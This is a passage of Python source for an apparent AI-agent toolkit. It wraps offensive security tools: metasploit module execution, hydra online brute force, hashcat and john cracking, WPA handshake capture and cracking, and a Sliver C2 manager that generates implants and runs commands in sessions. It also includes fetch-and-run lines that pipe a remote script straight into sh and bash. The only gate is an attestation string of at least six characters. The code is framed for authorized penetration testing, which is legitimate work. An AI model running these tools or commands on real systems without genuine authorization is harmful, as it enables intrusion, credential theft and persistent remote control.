    return _http_get(url, headers={"User-Agent": _BROWSER_UA,
                                   "Accept-Language": "en,de;q=0.8"})


def _norm_url(u: str) -> str:
    u = (u or "").strip()
    if not u:
        return ""
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u.rstrip("/")


def _plugin_latest(slug: str) -> str:
    """Latest published version from the keyless WordPress.org plugin API."""
    body, status, _ = _wp_fetch(WPORG_PLUGIN_API.format(slug=slug))
    if status == 200 and body:
        try:
            v = json.loads(body).get("version")
            if isinstance(v, str):
                return v
        except Exception:  # noqa: BLE001
            pass
    return ""


def _readme_stable(base: str, slug: str) -> str:
    """Installed plugin version from its readme.txt 'Stable tag', if reachable."""
    body, status, _ = _wp_fetch(f"{base}/wp-content/plugins/{slug}/readme.txt")
    if status == 200 and body:
        m = re.search(r"(?im)^\s*Stable tag:\s*([0-9][0-9A-Za-z.\-]*)", body)
        if m:
            return m.group(1)
    return ""


def _detect_wp(url: str) -> dict:
    """Passively enumerate WordPress core, plugins and themes with versions.

    Version source per plugin/theme: the `?ver=` on its asset URLs in the page
    (usually the real installed version), else its readme.txt / style.css.
    """
    base = _norm_url(url)
    home, status, err = _wp_fetch(base + "/")
    out = {"base": base, "is_wp": False, "core": "", "plugins": {}, "themes": {},
           "status": status, "error": err}
    if status != 200 or not home:
        # try /readme.html and /wp-login.php as secondary signals
        rl, rs, _ = _wp_fetch(base + "/wp-login.php")
        if rs != 200:
            return out
        home = rl
    blob = home
    # core version
    m = re.search(r'name=["\']generator["\']\s+content=["\']WordPress\s+([0-9.]+)', blob, re.I)
    if not m:
        rh, rs, _ = _wp_fetch(base + "/readme.html")
        if rs == 200:
            m = re.search(r'Version\s+([0-9.]+)', rh)
    if m:
        out["core"] = m.group(1)
    # plugins: slug + optional ?ver=
    for slug, ver in re.findall(
            r'/wp-content/plugins/([a-zA-Z0-9\-_]+)/[^"\'?]*(?:\?[^"\']*?ver=([0-9][0-9.]*))?',
            blob):
        out.setdefault("plugins", {})
        cur = out["plugins"].get(slug, "")
        if ver and not cur:
            out["plugins"][slug] = ver
        else:
            out["plugins"].setdefault(slug, cur)
    # themes: slug (version from style.css later)
    for slug in set(re.findall(r'/wp-content/themes/([a-zA-Z0-9\-_]+)/', blob)):
        out["themes"].setdefault(slug, "")
    out["is_wp"] = bool(out["core"] or out["plugins"] or out["themes"]
                        or "/wp-content/" in blob or "wp-json" in blob)
    # fill missing plugin versions from readme.txt (authoritative Stable tag)
    for slug in list(out["plugins"]):
        if not out["plugins"][slug]:
            out["plugins"][slug] = _readme_stable(base, slug)
    # theme versions from style.css
    for slug in list(out["themes"]):
        css, cs, _ = _wp_fetch(f"{base}/wp-content/themes/{slug}/style.css")
        if cs == 200:
            tm = re.search(r"(?im)^\s*Version:\s*([0-9][0-9A-Za-z.\-]*)", css)
            if tm:
                out["themes"][slug] = tm.group(1)
    return out


def _wpscan_lookup(kind: str, slug: str) -> list | None:
    """WPScan API v3 vulnerabilities for a plugin/theme slug. None if no token."""
    if not WPSCAN_API_TOKEN:
        return None
    body, status, _ = _http_get(
        f"https://wpscan.com/api/v3/{kind}/{slug}",
        headers={"Authorization": f"Token token={WPSCAN_API_TOKEN}"})
    if status != 200 or not body:
        return []
    try:
        data = json.loads(body).get(slug, {})
        vulns = []
        for v in data.get("vulnerabilities", []) or []:
            cves = (v.get("references", {}) or {}).get("cve", []) or []
            vulns.append({
                "title": v.get("title", ""),
                "cve": ", ".join("CVE-" + c for c in cves) if cves else "",
                "fixed_in": v.get("fixed_in") or "?",
            })
        return vulns
    except Exception:  # noqa: BLE001
        return []


def _nvd_lookup(keyword: str, limit: int = 5, cve_id: str = "") -> list:
    """Keyless NVD lookup by keyword or exact CVE id. Best-effort, never raises."""
    if cve_id:
        q = f"{NVD_CVE_API}?cveId={cve_id}"
    else:
        q = (f"{NVD_CVE_API}?keywordSearch={urllib.parse.quote(keyword)}"
             f"&resultsPerPage={limit}")
    body, status, _ = _http_get(q, headers={"User-Agent": _BROWSER_UA})
    if status != 200 or not body:
        return []
    try:
        d = json.loads(body)
    except Exception:  # noqa: BLE001
        return []
    out = []
    for item in d.get("vulnerabilities", [])[:max(limit, 1)]:
        c = item.get("cve", {})
        score = ""
        metrics = c.get("metrics", {}) or {}
        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if metrics.get(k):
                score = metrics[k][0].get("cvssData", {}).get("baseScore", "")
                break
        desc = ""
        for dd in c.get("descriptions", []):
            if dd.get("lang") == "en":
                desc = dd.get("value", "")
                break
        out.append({"cve": c.get("id", ""), "cvss": score,
                    "published": (c.get("published", "") or "")[:10],
                    "desc": " ".join(desc.split())[:160]})
    return out


def tool_wp_vulnscan(args: dict) -> str:
    """Detect a WordPress site's components and flag outdated / vulnerable ones."""
    url = _norm_url(str(args.get("url", "")))
    if not url:
        return "wp_vulnscan: give a 'url' (a site you own or are authorized to test)."
    want_cves = str(args.get("cves", "")).lower() in ("1", "true", "yes") or bool(WPSCAN_API_TOKEN)
    det = _detect_wp(url)
    if det.get("error") and not det.get("is_wp"):
        return f"wp_vulnscan: could not reach {url} ({det['error']})."
    if not det.get("is_wp"):
        return (f"wp_vulnscan: {url} does not look like WordPress "
                f"(no wp-content/wp-json/generator signals). Nothing to enumerate.")
    lines = [f"WordPress scan of {url}"]
    if det["core"]:
        lines.append(f"  core: WordPress {det['core']}")
        if want_cves:
            for v in _nvd_lookup(f"wordpress {det['core']}", 3):
                lines.append(f"    CVE {v['cve']} (cvss {v['cvss']}): {v['desc']}")
    comps = ([("plugins", s, v) for s, v in det["plugins"].items()]
             + [("themes", s, v) for s, v in det["themes"].items()])
    if not comps:
        lines.append("  no plugins/themes detected from the homepage (try an authenticated "
                     "scan or wpscan for depth).")
    flagged = 0
    for kind, slug, ver in comps[:WPVULN_MAX]:
        latest = _plugin_latest(slug) if kind == "plugins" else ""
        outdated = bool(ver and latest and ver != latest)
        tag = f"{kind[:-1]} {slug}"
        vtxt = f"v{ver}" if ver else "version?"
        parts = [f"  {tag}: {vtxt}"]
        if latest:
            parts.append(f"(latest {latest}{' — OUTDATED' if outdated else ''})")
        lines.append(" ".join(parts))
        if outdated:
            flagged += 1
        if want_cves:
            wp = _wpscan_lookup(kind, slug)
            if wp is not None:
                for v in wp:
                    lines.append(f"      VULN {v['title']} [{v['cve']}] fixed in {v['fixed_in']}")
                    flagged += 1
            else:
                for v in _nvd_lookup(slug.replace("-", " "), 3):
                    lines.append(f"      CVE {v['cve']} (cvss {v['cvss']}): {v['desc']}")
    if len(comps) > WPVULN_MAX:
        lines.append(f"  ... {len(comps) - WPVULN_MAX} more (raise SYGNIF_PY_WPVULN_MAX)")
    src = ("WPScan API (token set)" if WPSCAN_API_TOKEN
           else ("keyless NVD keyword + WordPress.org latest-version" if want_cves
                 else "outdated-check only — pass cves=true or set WPSCAN_API_TOKEN for CVE matching"))
    lines.append(f"  [source: {src}. Verify each hit; version detection is passive and "
                 f"can be masked. Only scan sites you are authorized to test.]")
    if flagged:
        lines.insert(1, f"  ⚠ {flagged} outdated/vulnerable signal(s) — see below.")
    return _truncate("\n".join(lines))


def tool_vuln_check(args: dict) -> str:
    """Known-vulnerability tester: CVEs for a product+version, a WP slug, or a CVE id."""
    cve = str(args.get("cve", "")).strip().upper()
    product = str(args.get("product", "") or args.get("slug", "")).strip()
    version = str(args.get("version", "")).strip()
    kind = str(args.get("kind", "plugins")).strip() or "plugins"
    if cve:
        hits = _nvd_lookup("", cve_id=cve)
        if not hits:
            return f"vuln_check: no NVD record for {cve} (check the id)."
        v = hits[0]
        return (f"{v['cve']}  cvss {v['cvss']}  published {v['published']}\n{v['desc']}\n"
                f"[source: NVD. Confirm applicability to your exact version.]")
    if not product:
        return ("vuln_check: give a 'product' (or 'slug'), optional 'version'; or a 'cve' id. "
                "e.g. {product:'elementor', version:'3.5.0'} or {cve:'CVE-2024-...'}")
    # WP slug via WPScan when a token is set (exact affected ranges)
    wp = _wpscan_lookup(kind, product) if WPSCAN_API_TOKEN else None
    if wp is not None:
        if not wp:
            return f"vuln_check: WPScan lists no known vulnerabilities for {kind[:-1]} '{product}'."
        out = [f"Known vulnerabilities for {kind[:-1]} '{product}' (WPScan):"]
        for v in wp:
            out.append(f"  {v['title']} [{v['cve']}] fixed in {v['fixed_in']}")
        return _truncate("\n".join(out))
    kw = f"{product} {version}".strip()
    hits = _nvd_lookup(kw, 8)
    if not hits:
        return (f"vuln_check: NVD returned nothing for '{kw}'. Try the plain product name, "
                f"or set WPSCAN_API_TOKEN for WordPress plugin/theme coverage.")
    out = [f"NVD matches for '{kw}' (keyless keyword search — verify each applies to your version):"]
    for v in hits:
        out.append(f"  {v['cve']} (cvss {v['cvss']}, {v['published']}): {v['desc']}")
    return _truncate("\n".join(out))



# --- Offensive capability tools (AUTHORIZED ENGAGEMENTS ONLY) ----------------
# Structured wrappers around the standard full-power pentest binaries. Every tool
# here REQUIRES two things from the operator and refuses without them:
#   target        — a single named host / domain / URL / interface (never a mass sweep)
#   authorization — a short attestation of who authorized testing that target
# When ~/sygnif-pentest/SCOPE.md lists in-scope hosts, the target must match one.
# Deliberately NOT built: C2 / persistence, detection-evasion, or mass targeting.
# Tools shell out to the sygnif-kali container when present, else the host, so
# they work on a Kali box or a plain Linux install alike.
import shlex

OFFENSIVE_TIMEOUT = int(os.environ.get("SYGNIF_PY_OFFENSIVE_TIMEOUT", "1800"))
SCOPE_FILE = os.path.expanduser(os.environ.get("SYGNIF_PY_SCOPE_FILE", "~/sygnif-pentest/SCOPE.md"))
# --- self-contained Docker toolbox ------------------------------------------
# sygnif-py OWNS its pentest toolbox so the offensive/network tools depend on
# nothing pre-existing. It ADOPTS an already-present container (env override,
# then sygnif-py-toolbox, then legacy sygnif-kali), else self-provisions
# sygnif-py-toolbox from the Kali image. Host is the fallback when Docker is absent.
TOOLBOX_IMAGE = os.environ.get("SYGNIF_PY_KALI_IMAGE", "kalilinux/kali-rolling")
TOOLBOX_NAME = os.environ.get("SYGNIF_PY_KALI_CONTAINER", "sygnif-py-toolbox")
_TOOLBOX_CANDIDATES = list(dict.fromkeys([TOOLBOX_NAME, "sygnif-py-toolbox", "sygnif-kali"]))


def _docker_ok() -> bool:
    return not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0


def _container_state(name: str) -> str:
    out, rc = _run_host("docker inspect -f '{{.State.Status}}' " + shlex.quote(name) + " 2>/dev/null", 10)
    return out.strip() if rc == 0 else ""


def _toolbox_name(auto_create: bool = False) -> str:
    """Resolve a usable toolbox container name, or '' for host-only.

    Adopts an existing candidate (starting it if stopped). With auto_create,
    provisions sygnif-py-toolbox from the Kali image when none exists and Docker
    is available (one-time base-image pull)."""
    if not _docker_ok():
        return ""
    for name in _TOOLBOX_CANDIDATES:
        st = _container_state(name)
        if st == "running":
            return name
        if st in ("exited", "created", "paused"):
            _run_host("docker start " + shlex.quote(name), 60)
            if _container_state(name) == "running":
                return name
    if not auto_create:
        return ""
    _run_host("docker run -d --name " + shlex.quote(TOOLBOX_NAME) + " --restart unless-stopped "
              "--network host --cap-add=NET_ADMIN --cap-add=NET_RAW " + shlex.quote(TOOLBOX_IMAGE)
              + " sleep infinity", 900)
    return TOOLBOX_NAME if _container_state(TOOLBOX_NAME) == "running" else ""


_KALI_CONTAINER = TOOLBOX_NAME


def _scope_targets() -> set | None:
    """In-scope hosts parsed from SCOPE.md, or None if the file is absent/empty."""
    try:
        txt = open(SCOPE_FILE, encoding="utf-8").read()
    except OSError:
        return None
    found = set(re.findall(r"\b(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9.\-]*\.[a-z]{2,})\b",
                           txt, re.I))
    # drop the boilerplate example/label tokens the template ships with
    found = {f.lower() for f in found if f.lower() not in ("hosts.ips.urls", "e.g")}
    return found or None


def _bare_host(target: str) -> str:
    t = str(target).strip()
    t = re.sub(r"^\w+://", "", t)
    return t.split("/")[0].split(":")[0].lower()


def _authz(args: dict, target: str) -> str | None:
    """Authorization gate. Returns a refusal string, or None when cleared."""
    if not target:
        return "REFUSED: no 'target' given (a single host / domain / URL / interface)."
    auth = str(args.get("authorization", "") or args.get("auth", "")).strip()
    if len(auth) < 6:
        return ("REFUSED: set 'authorization' — a short attestation that you are authorized to "
                f"test '{target}' (owner / engagement / ticket). Authorized targets only; this "
                "tool will not run without it.")
    scoped = _scope_targets()
    if scoped:
        t = _bare_host(target)
        if not any(t == s or t.endswith("." + s) for s in scoped):
            return (f"REFUSED: '{t}' is not in SCOPE.md. In scope: "
                    f"{', '.join(sorted(scoped))[:200]}. Add it to your authorized scope first.")
    return None


def _off_run(command: str, timeout: int | None = None) -> tuple[str, int, str]:
    """Run a command in sygnif-py's Docker toolbox if available, else on the host."""
    timeout = timeout or OFFENSIVE_TIMEOUT
    box = _toolbox_name(auto_create=False)
    if box:
        out, rc = _run_host("docker exec " + shlex.quote(box) + " bash -lc " + shlex.quote(command), timeout)
        return out, rc, f"docker:{box}"
    out, rc = _run_host(command, timeout)
    return out, rc, "host"


def _off_report(title: str, auth: str, cmd: str, out: str, rc: int, where: str) -> str:
    return _truncate(f"[{title} | authorized-by: {auth} | via {where}]\n$ {cmd}\n\n{out}\n"
                     f"exit={rc}")


def _have(binname: str) -> bool:
    o, rc, _ = _off_run(f"command -v {shlex.quote(binname)} >/dev/null 2>&1 && echo yes", 15)
    return "yes" in o


# 1. recon / OSINT — subdomains, DNS, tech, live hosts (passive-first)
def tool_recon(args: dict) -> str:
    target = str(args.get("target", "") or args.get("domain", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    dom = _bare_host(target)
    extra = str(args.get("extra", "")).strip()
    q = shlex.quote(dom)
    cmd = (
        f"echo '== subfinder =='; subfinder -silent -d {q} 2>/dev/null | tee /tmp/_subs.txt; "
        f"echo '== dns =='; dig +short {q} A; dig +short {q} MX; "
        f"echo '== SPF/DMARC =='; dig +short TXT {q}; dig +short TXT _dmarc.{q}; "
        f"echo '== whatweb =='; whatweb -q {q} 2>/dev/null; "
        f"echo '== live hosts (httpx) =='; ( [ -s /tmp/_subs.txt ] && httpx -silent -title -tech-detect -status-code < /tmp/_subs.txt 2>/dev/null | head -50 )"
        + (f"; {extra}" if extra else "")
    )
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
    return _off_report("recon", args.get("authorization", ""), "recon " + dom, out, rc, where)


# 2. nuclei — templated vulnerability scan (community + optional Wordfence WP CVEs)
def tool_nuclei(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    tags = str(args.get("tags", "")).strip()
    sev = str(args.get("severity", "")).strip()
    extra = str(args.get("extra", "")).strip()
    xtpl = os.environ.get("SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES", "").strip()
    parts = [f"nuclei -u {shlex.quote(target)} -silent -nc"]
    if tags:
        parts.append(f"-tags {shlex.quote(tags)}")
    if sev:
        parts.append(f"-severity {shlex.quote(sev)}")
    if xtpl:
        parts.append(f"-t {shlex.quote(xtpl)}")  # e.g. the nuclei-wordfence-cve template dir
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts))
    if rc != 0 and not _have("nuclei"):
        return ("nuclei not installed — `SYGNIF_PY_KALI_METAPACKAGE=kali-tools-web sygnif kali-setup` "
                "or `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`. Add the "
                "Wordfence WP CVE templates and point SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES at them.")
    return _off_report("nuclei", args.get("authorization", ""), " ".join(parts), out, rc, where)


# 3. wpscan — full WordPress enumeration (structured wp_vulnscan's active sibling)
def tool_wpscan(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    enum = str(args.get("enumerate", "vp,vt,u,cb,dbe")).strip()
    tok = os.environ.get("WPSCAN_API_TOKEN", "").strip()
    extra = str(args.get("extra", "")).strip()
    parts = [f"wpscan --url {shlex.quote(target)} --no-banner --format cli-no-color",
             f"--enumerate {shlex.quote(enum)}", "--random-user-agent"]
    if tok:
        parts.append(f"--api-token {shlex.quote(tok)}")
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts))
    if not tok and "--api-token" not in out:
        out += "\n[no WPSCAN_API_TOKEN set — enumeration ran but CVE data is limited; free token at wpscan.com/api]"
    return _off_report("wpscan", args.get("authorization", ""), " ".join(parts), out, rc, where)


# 4. exploit_search — offline Exploit-DB lookup (searchsploit). DB search, ungated.
def tool_exploit_search(args: dict) -> str:
    query = str(args.get("query", "") or args.get("cve", "")).strip()
    if not query:
        return "exploit_search: give a 'query' (product/version) or a 'cve' id."
    if re.fullmatch(r"(?i)cve-\d{4}-\d+", query):
        cmd = f"searchsploit --cve {shlex.quote(query.upper())}"
    else:
        cmd = f"searchsploit {shlex.quote(query)}"
    out, rc, where = _off_run(cmd, 120)
    if rc != 0 and not _have("searchsploit"):
        return "searchsploit not installed (part of exploitdb; `sygnif kali-setup` or apt install exploitdb)."
    return _off_report("exploit_search", "n/a (offline DB)", cmd, out, rc, where)


# 5. metasploit driver — run an msf module non-interactively (exploitation framework)
def tool_msf(args: dict) -> str:
    target = str(args.get("target", "") or args.get("rhosts", "")).strip()
    module = str(args.get("module", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    if not module:
        return ("msf: give a 'module' (e.g. 'auxiliary/scanner/http/wordpress_login_enum') and any "
                "'options' dict. Validate the module and blast radius before firing; least-destructive first.")
    opts = args.get("options", {}) or {}
    setlines = [f"set RHOSTS {shlex.quote(target)}"]
    for k, v in opts.items():
        setlines.append(f"set {k} {shlex.quote(str(v))}")
    action = str(args.get("action", "run")).strip() or "run"
    rc_script = "; ".join([f"use {module}"] + setlines + [action, "exit"])
    cmd = f"msfconsole -q -x {shlex.quote(rc_script)}"
    out, rc, where = _off_run(cmd)
    return _off_report("metasploit", args.get("authorization", ""), cmd, out, rc, where)


# 6. bruteforce — online credential testing (hydra). Loud + can lock accounts.
def tool_bruteforce(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    service = str(args.get("service", "")).strip()  # ssh, ftp, http-post-form, wordpress...
    g = _authz(args, target)
    if g:
        return g
    if not service:
        return ("bruteforce: give a 'service' (ssh|ftp|smb|http-get|http-post-form|...), plus "
                "'userlist'+'passlist' (or 'user'/'password'). Online brute is LOUD and can lock "
                "accounts — authorized + rate-agreed engagements only.")
    users = str(args.get("userlist", "")).strip()
    passl = str(args.get("passlist", "")).strip()
    u = f"-L {shlex.quote(users)}" if users else (f"-l {shlex.quote(args['user'])}" if args.get("user") else "")
    p = f"-P {shlex.quote(passl)}" if passl else (f"-p {shlex.quote(args['password'])}" if args.get("password") else "")
    if not u or not p:
        return "bruteforce: need a user source (userlist|user) and a password source (passlist|password)."
    extra = str(args.get("extra", "")).strip()
    path = str(args.get("path", "")).strip()
    cmd = f"hydra {u} {p} -t 4 -f {shlex.quote(target)} {shlex.quote(service)} {path} {extra}".strip()
    out, rc, where = _off_run(cmd)
    if rc != 0 and not _have("hydra"):
        return "hydra not installed (`sygnif kali-setup` or apt install hydra)."
    return _off_report("bruteforce", args.get("authorization", ""), cmd, out, rc, where)


# 7. crack — offline hash cracking (hashcat, else john). Operate on hashes you are
#    authorized to hold; the 'target' names the engagement/host they came from.
def tool_crack(args: dict) -> str:
    target = str(args.get("target", "") or "offline-hashes").strip()
    g = _authz(args, target)
    if g:
        return g
    hashfile = str(args.get("hashfile", "")).strip()
    if not hashfile:
        return "crack: give a 'hashfile' path, a hashcat 'mode' (e.g. 22000 WPA, 0 MD5, 1000 NTLM), and a 'wordlist'."
    mode = str(args.get("mode", "")).strip()
    wl = str(args.get("wordlist", "/usr/share/wordlists/rockyou.txt")).strip()
    extra = str(args.get("extra", "")).strip()
    if _have("hashcat") and mode:
        cmd = f"hashcat -m {shlex.quote(mode)} {shlex.quote(hashfile)} {shlex.quote(wl)} --quiet {extra}".strip()
    else:
        cmd = f"john --wordlist={shlex.quote(wl)} {shlex.quote(hashfile)} {extra}".strip()
    out, rc, where = _off_run(cmd)
    return _off_report("crack", args.get("authorization", ""), cmd, out, rc, where)


# 8. postexploit — LOCAL privilege-escalation enumeration on an authorized host.
#    Enumeration only (no persistence / no lateral movement). RoE-gated.
def tool_postexploit(args: dict) -> str:
    target = str(args.get("target", "") or "localhost").strip()
    g = _authz(args, target)
    if g:
        return g
    if _have("linpeas") or _have("linpeas.sh"):
        cmd = "linpeas -q 2>/dev/null || linpeas.sh -q"
    elif str(args.get("fetch", "")).lower() in ("1", "true", "yes"):
        cmd = "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    else:
        # built-in quick local enum, no downloads
        cmd = ("echo '== id =='; id; echo '== sudo -l =='; sudo -n -l 2>&1 | head; "
               "echo '== kernel =='; uname -a; echo '== SUID =='; find / -perm -4000 -type f 2>/dev/null | head -40; "
               "echo '== world-writable dirs =='; find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head -30; "
               "echo '== listening =='; ss -tlnp 2>/dev/null | head -30; echo '== cron =='; ls -la /etc/cron* 2>/dev/null")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("postexploit(local-enum)", args.get("authorization", ""), "local enumeration", out, rc, where)


# 9. wifi_capture — WPA handshake / PMKID capture on an authorized network.
#    Requires a monitor-mode interface and an explicit BSSID/SSID authorization.
def tool_wifi_capture(args: dict) -> str:
    iface = str(args.get("interface", "") or args.get("iface", "")).strip()
    bssid = str(args.get("bssid", "") or args.get("ssid", "")).strip()
    target = bssid or iface
    g = _authz(args, target)
    if g:
        return g
    if not iface:
        return ("wifi_capture: give the PHYSICAL 'interface' (e.g. wlan0) and the 'bssid' of the "
                "network YOU are authorized to test. hcxdumptool (>=7.x) sets monitor mode itself — "
                "pass the real interface, NOT a wlanXmon virtual one, and do not run airmon-ng first.")
    out_file = str(args.get("out", "/tmp/capture.pcapng")).strip()
    secs = int(args.get("seconds", 60))
    channel = str(args.get("channel", "")).strip()
    extra = str(args.get("extra", "")).strip()
    # hcxdumptool 6.3/7.x: target one AP by compiling a BPF on its BSSID (addr3),
    # not the removed --filterlist_ap. Frequencies: -c <chan+band e.g. 11a> or -F (all).
    pre, bpf = "", ""
    if bssid:
        mac = re.sub(r"[^0-9a-fA-F]", "", bssid)
        if len(mac) == 12:
            pre = f"hcxdumptool --bpfc={shlex.quote('wlan addr3 ' + mac)} > /tmp/_wifi.bpf 2>/dev/null; "
            bpf = "--bpf=/tmp/_wifi.bpf "
    freq = f"-c {shlex.quote(channel)} " if channel else "-F "
    cmd = (f"{pre}timeout {secs} hcxdumptool -i {shlex.quote(iface)} -w {shlex.quote(out_file)} "
           f"{freq}{bpf}{extra}").strip()
    out, rc, where = _off_run(cmd, secs + 30)
    if rc != 0 and not _have("hcxdumptool"):
        return ("hcxdumptool not installed (`apt install hcxdumptool`), or the adapter lacks "
                "monitor-mode + frame-injection. Alternative via the shell tool: airmon-ng start "
                f"{iface}; airodump-ng -c <ch> --bssid {bssid or '<BSSID>'} -w cap {iface}mon.")
    tail = ("\n[next: hcxpcapngtool -o hash.22000 " + out_file
            + "  then the 'crack' tool {hashfile:hash.22000, mode:22000, wordlist:...}. "
            "hcxdumptool + hcxpcapngtool versions must match. WPA3-SAE is not affected.]")
    return _off_report("wifi_capture", args.get("authorization", ""), cmd, out + tail, rc, where)


# 10. wifi_crack — turn a capture into a hash and crack it (offline).
def tool_wifi_crack(args: dict) -> str:
    cap = str(args.get("capture", "") or args.get("pcapng", "")).strip()
    target = str(args.get("target", "") or cap or "wifi-capture").strip()
    g = _authz(args, target)
    if g:
        return g
    if not cap:
        return "wifi_crack: give the 'capture' file (.pcapng/.cap) and a 'wordlist'."
    wl = str(args.get("wordlist", "/usr/share/wordlists/rockyou.txt")).strip()
    hashf = "/tmp/_wifi.22000"
    conv = (f"hcxpcapngtool -o {hashf} {shlex.quote(cap)} 2>/dev/null || "
            f"(aircrack-ng {shlex.quote(cap)} -w {shlex.quote(wl)})")
    cmd = f"{conv}; [ -s {hashf} ] && hashcat -m 22000 {hashf} {shlex.quote(wl)} --quiet"
    out, rc, where = _off_run(cmd)
    return _off_report("wifi_crack", args.get("authorization", ""), cmd, out, rc, where)



# --- C2 orchestration (AUTHORIZED ADVERSARY EMULATION ONLY) -----------------
# A thin manager around a standard open-source C2 framework — Sliver
# (BishopFox/sliver, MIT) by default — for authorized red-team / adversary-
# emulation engagements: stand up a listener, generate a beacon/implant for the
# authorized scope, list sessions/beacons, run a command in a session. Same hard
# gate as the other offensive tools: a 'target' (the engagement/scope) plus an
# 'authorization' attestation, SCOPE.md-confined when present.
# It ORCHESTRATES a known framework; it does not build custom implants, AV/EDR
# evasion, or anything for mass/unauthorized deployment. Live interactive shells
# belong in a real sliver-client — this drives the scriptable operations.
SLIVER_BIN = os.environ.get("SYGNIF_PY_SLIVER_BIN", "sliver-server")


def _sliver(console_script: str, timeout: int | None = None) -> tuple[str, int, str]:
    """Pipe newline-separated console commands to sliver-server (best-effort;
    Sliver has no one-shot flag, so we feed the console over stdin)."""
    cmd = "printf '%s\\n' " + shlex.quote(console_script) + " | " + SLIVER_BIN
    return _off_run(cmd, timeout or OFFENSIVE_TIMEOUT)


def tool_c2(args: dict) -> str:
    """Manage a Sliver C2 for an authorized engagement (listener/generate/sessions/exec)."""
    op = str(args.get("op", "") or args.get("action", "status")).strip().lower()

    # status/help never touch a target — pure local capability check.
    if op in ("status", "check", ""):
        o, rc, where = _off_run(
            "command -v " + shlex.quote(SLIVER_BIN) + " && " + shlex.quote(SLIVER_BIN)
            + " version 2>/dev/null | head -5", 30)
        if rc != 0 or not o.strip():
            return ("c2: Sliver not installed. It's the standard open-source C2 for authorized "
                    "red-team work (BishopFox/sliver, MIT). Install: "
                    "`curl https://sliver.sh/install | sudo bash`, or `apt install sliver` on Kali. "
                    "Set SYGNIF_PY_SLIVER_BIN if the binary name differs (default " + SLIVER_BIN + ").")
        return _off_report("c2 status", "n/a", SLIVER_BIN + " version", o, rc, where)
    if op == "help":
        return ("c2 ops: status | listener | generate | sessions | beacons | exec. "
                "All except status need target + authorization. "
                "listener {op:listener, proto:https|http|mtls, lport, lhost}. "
                "generate {op:generate, os:windows|linux|darwin, arch:amd64, format:exe|shellcode|shared, "
                "proto:https, lhost, lport, beacon:true, save:/path}. "
                "exec {op:exec, session:<id>, command:'whoami'}.")

    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    auth = args.get("authorization", "")

    if op == "listener":
        proto = str(args.get("proto", "https")).lower()
        lport = str(args.get("lport", "443" if proto == "https" else "80")).strip()
        lhost = str(args.get("lhost", "")).strip()
        line = {"https": "https --lport " + lport, "http": "http --lport " + lport,
                "mtls": "mtls --lport " + lport}.get(proto, "https --lport " + lport)
        if lhost:
            line += " --lhost " + lhost
        o, rc, where = _sliver(line + "\njobs\nexit", 120)
        return _off_report("c2 listener", auth, line, o, rc, where)

    if op == "generate":
        os_ = str(args.get("os", "windows")).lower()
        arch = str(args.get("arch", "amd64")).lower()
        fmt = str(args.get("format", "exe")).lower()
        proto = str(args.get("proto", "https")).lower()
        lhost = str(args.get("lhost", "")).strip()
        lport = str(args.get("lport", "443")).strip()
        save = str(args.get("save", "/tmp/implant")).strip()
        beacon = "beacon " if str(args.get("beacon", "")).lower() in ("1", "true", "yes") else ""
        if not lhost:
            return "c2 generate: give 'lhost' (the C2 callback host for this authorized engagement)."
        gen = ("generate " + beacon + "--os " + os_ + " --arch " + arch + " --format " + fmt
               + " --" + proto + " " + lhost + ":" + lport + " --save " + save)
        o, rc, where = _sliver(gen + "\nexit", 600)
        return _off_report("c2 generate", auth, gen, o, rc, where)

    if op in ("sessions", "beacons"):
        o, rc, where = _sliver(op + "\nexit", 60)
        return _off_report("c2 " + op, auth, op, o, rc, where)

    if op == "exec":
        sid = str(args.get("session", "") or args.get("id", "")).strip()
        command = str(args.get("command", "") or args.get("cmd", "")).strip()
        if not sid or not command:
            return "c2 exec: give 'session' (id) and 'command'. For live interactive control use sliver-client."
        script = "sessions -i " + sid + "\nexecute -o -- " + command + "\nbackground\nexit"
        o, rc, where = _sliver(script, 120)
        return _off_report("c2 exec", auth, "session " + sid + ": " + command, o, rc, where)

    return ("c2: unknown op '" + op + "'. Use status | listener | generate | sessions | beacons | "
            "exec (see op=help).")


# --- Gap-fill tools: code security, TLS/headers, takeover, OSINT, network,
#     password strength, cellular (defensive) ----------------------------------
# Local-file tools (secrets_scan, sast) run on the HOST where the seat runs, so
# they see your own code; network tools run in the kali container if present.
# Cellular here is DEFENSIVE ONLY: your own modem's serving cell + tower lookup +
# IMSI-catcher detection. No transmitting, no interception — that is illegal.
import hashlib
import math

HIBP_RANGE = "https://api.pwnedpasswords.com/range/"
OPENCELLID = "https://opencellid.org/cell/get"
OPENCELLID_KEY = os.environ.get("OPENCELLID_API_KEY", "").strip()


def _resp_headers(url: str) -> tuple[dict, int, str]:
    """GET a URL and return (headers_dict_lowercased, status, error)."""
    req = urllib.request.Request(
        url, headers={"User-Agent": _BROWSER_UA, "Accept": "*/*"}, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            h = {k.lower(): v for k, v in r.headers.items()}
            return h, getattr(r, "status", 200), ""
    except urllib.error.HTTPError as e:
        h = {k.lower(): v for k, v in (e.headers or {}).items()}
        return h, e.code, f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        return {}, 0, f"{type(e).__name__}: {e}"


# 1. secrets_scan — trufflehog + gitleaks over a repo/dir you own (runs on host)
def _local_or_toolbox(path: str, cmd_tmpl: str, need_bin: str, timeout: int = 900):
